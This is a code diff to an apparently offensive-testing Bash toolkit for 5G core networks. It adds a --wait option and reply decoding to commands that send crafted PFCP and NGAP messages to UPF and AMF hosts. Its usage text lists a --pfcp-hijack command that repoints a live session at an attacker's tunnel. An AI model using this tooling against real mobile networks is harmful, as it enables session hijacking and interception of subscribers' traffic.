@@ -961,11 +961,25 @@ ncore_cmd_pfcp_delete() {  # <seid> [seq]
     printf 'requires\tthe same reachability a --pfcp-send needs; the SEID is in the establishment response\n'
 }
 
-ncore_cmd_pfcp_send() {  # <upf-host> [port] [hex]
-    local host="${1:-}" port="${2:-8805}" hex="${3:-}"
+ncore_cmd_pfcp_send() {  # <upf-host> [port] [hex] [--wait N]
+    local host="" port=8805 hex="" wait=0
+    while (( $# )); do
+        case "$1" in
+            --wait) (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || {
+                        printf 'ERROR\t--wait takes seconds; a reply is the only proof a UDP send arrived\n' >&2; return 2; }
+                    wait="$2"; shift 2 ;;
+            -*)     printf 'ERROR\t--pfcp-send does not take %s\n' "$1" >&2; return 2 ;;
+            *)      [[ -n "$1" ]] || { shift; continue; }
+                    if [[ -z "$host" ]]; then host="$1"
+                    elif [[ "$port" == "8805" && "$1" =~ ^[0-9]+$ ]]; then port="$1"
+                    elif [[ -z "$hex" ]]; then hex="$1"
+                    else printf 'ERROR\t--pfcp-send takes <host> [port] [hex] [--wait N]\n' >&2; return 2; fi
+                    shift ;;
+        esac
+    done
     local tool="$IMSISTING_ROOT/tools/udp_assoc.py"
-    if [[ -z "$host" ]]; then
-        printf 'ERROR\tneed <upf-host> [port] [hex]\n' >&2
+    if [[ -z "$host" || "$host" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\tneed <upf-host> [port] [hex]; a port on its own is not a host\n' >&2
         return 2
     fi
     [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2; return 1; }
@@ -976,7 +990,26 @@ ncore_cmd_pfcp_send() {  # <upf-host> [port] [hex]
     printf 'leg\tPFCP (N4)\n'
     printf 'target\t%s:%s\n' "$host" "$port"
     printf 'encapsulation\tudp\n'
-    timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "${NR_WAIT:-0}"
+    local out rep rc=0
+    out=$(timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "$wait" 2>&1) || rc=$?
+    printf '%s\n' "$out"
+    # A reply is the one thing UDP can report about arrival, so it is decoded
+    # here rather than left as a hex blob the caller has to feed back in.
+    rep=$(printf '%s\n' "$out" | awk -F'\t' '$1=="reply_hex"{print $2}')
+    if [[ -n "$rep" && "$rep" != "" ]]; then
+        local rmsg rtype
+        rmsg=$(ncore_decode_pfcp "$rep" | awk -F'\t' '$1=="message_type_name"{print $2; exit}')
+        rtype=$(ncore_decode_pfcp "$rep" | awk -F'\t' '$1=="message_type"{print $2; exit}')
+        if [[ -n "$rmsg" ]]; then
+            printf 'reply_decoded\t%s\n' "$rmsg"
+            printf 'reply_type\t%s\n' "$rtype"
+        else
+            printf 'reply_decoded\tnone: %s octets came back and they are not a PFCP message this tree can read\n' "$(( ${#rep} / 2 ))"
+        fi
+    elif [[ "$wait" != "0" ]]; then
+        printf 'reply_decoded\tnone within %ss\n' "$wait"
+    fi
+    return "$rc"
 }
 
 # ── XnAP encoders ───────────────────────────────────────────────────────
@@ -1242,11 +1275,25 @@ ncore_cmd_ngap_probe() {  # [amf-host] [port]
     return 0
 }
 
-ncore_cmd_ngap_send() {  # <amf-host> [port] [hex]
-    local host="${1:-}" port="${2:-38412}" hex="${3:-}"
+ncore_cmd_ngap_send() {  # <amf-host> [port] [hex] [--wait N]
+    local host="" port=38412 hex="" wait=0
+    while (( $# )); do
+        case "$1" in
+            --wait) (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || {
+                        printf 'ERROR\t--wait takes seconds\n' >&2; return 2; }
+                    wait="$2"; shift 2 ;;
+            -*)     printf 'ERROR\t--ngap-send does not take %s\n' "$1" >&2; return 2 ;;
+            *)      [[ -n "$1" ]] || { shift; continue; }
+                    if [[ -z "$host" ]]; then host="$1"
+                    elif [[ "$port" == "38412" && "$1" =~ ^[0-9]+$ ]]; then port="$1"
+                    elif [[ -z "$hex" ]]; then hex="$1"
+                    else printf 'ERROR\t--ngap-send takes <amf-host> [port] [hex] [--wait N]\n' >&2; return 2; fi
+                    shift ;;
+        esac
+    done
     local tool="$IMSISTING_ROOT/tools/sctp_assoc.py"
-    if [[ -z "$host" ]]; then
-        printf 'ERROR\tneed <amf-host> [port] [hex]\n' >&2
+    if [[ -z "$host" || "$host" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\tneed <amf-host> [port] [hex]; a port on its own is not a host\n' >&2
         return 2
     fi
     [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2; return 1; }
@@ -1258,7 +1305,22 @@ ncore_cmd_ngap_send() {  # <amf-host> [port] [hex]
     printf 'target\t%s:%s\n' "$host" "$port"
     printf 'encapsulation\tsctp\n'
     printf 'ppid\t60\n'
-    timeout 30 python3 "$tool" send "$host" "$port" "$hex" --ppid 60 --wait "${NR_WAIT:-0}"
+    local out rep rc=0
+    out=$(timeout 30 python3 "$tool" send "$host" "$port" "$hex" --ppid 60 --wait "$wait" 2>&1) || rc=$?
+    printf '%s\n' "$out"
+    rep=$(printf '%s\n' "$out" | awk -F'\t' '$1=="reply_hex"{print $2}')
+    if [[ -n "$rep" ]]; then
+        local rproc
+        rproc=$(ncore_decode_ngap "$rep" 2>/dev/null | awk -F'\t' '$1=="procedure_name"{print $2; exit}')
+        if [[ -n "$rproc" ]]; then
+            printf 'reply_decoded\t%s\n' "$rproc"
+        else
+            printf 'reply_decoded\tnone: %s octets came back and they are not an NGAP message this tree can read\n' "$(( ${#rep} / 2 ))"
+        fi
+    elif [[ "$wait" != "0" ]]; then
+        printf 'reply_decoded\tnone within %ss\n' "$wait"
+    fi
+    return "$rc"
 }
 
 # The rule structure a Session Establishment Request builds:
@@ -2398,7 +2460,7 @@ ncore_cli_main() {
         --pfcp-rules)      ncore_pfcp_rules "${1:-1}" "${2:-1}" ;;
         --pfcp-build)      ncore_cmd_pfcp_build "${1:-1}" "${2:-10.45.0.2}" "${3:-1}" \
                                                 "${4:-0}" "${5:-10.45.0.1}" ;;
-        --pfcp-send)       ncore_cmd_pfcp_send "${1:-}" "${2:-8805}" "${3:-}" ;;
+        --pfcp-send)       ncore_cmd_pfcp_send "$@" ;;
         --pfcp-hijack)     ncore_cmd_pfcp_hijack "${1:-}" "${2:-4242}" "${3:-127.0.0.1}" "${4:-1}" ;;
         --pfcp-delete)     ncore_cmd_pfcp_delete "${1:-}" "${2:-1}" ;;
         --ngap-initial-ue)  ncore_cmd_ngap_initial_ue "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
@@ -2436,7 +2498,7 @@ Usage: $0 COMMAND
   --pfcp-rules [teid] [qfi]     the PDR/FAR/QER/URR rule structure
   --pfcp-build [teid] [ue-ip] [seq] [seid] [upf-ip]
                                 build a Session Establishment Request (type 50)
-  --pfcp-send <upf-host> [port] [hex]
+  --pfcp-send <upf-host> [port] [hex] [--wait N]   UDP 8805, then read the reply
   --pfcp-hijack <seid> [teid] [attacker-ip] [far-id]
                                 C4: the Session Modification Request that
                                 repoints a live session at your tunnel
@@ -2452,7 +2514,7 @@ Usage: $0 COMMAND
   --xnap-setup [plmn] [gnb-id] [tac] [sst] [amf-region]
                                 build an XnSetupRequest (SCTP 38422, PPID 61)
   --xnap-decode <hex>           read one back: node id, TAC, slice
-  --ngap-send <amf-host> [port] [hex]
+  --ngap-send <amf-host> [port] [hex] [--wait N]   SCTP 38412, then read the reply
   --ngap-probe <amf-host> [port]
   --nas-count-check <before> <after> [--cause reauth|handover]
                                 C1: did the NAS COUNT advance, repeat
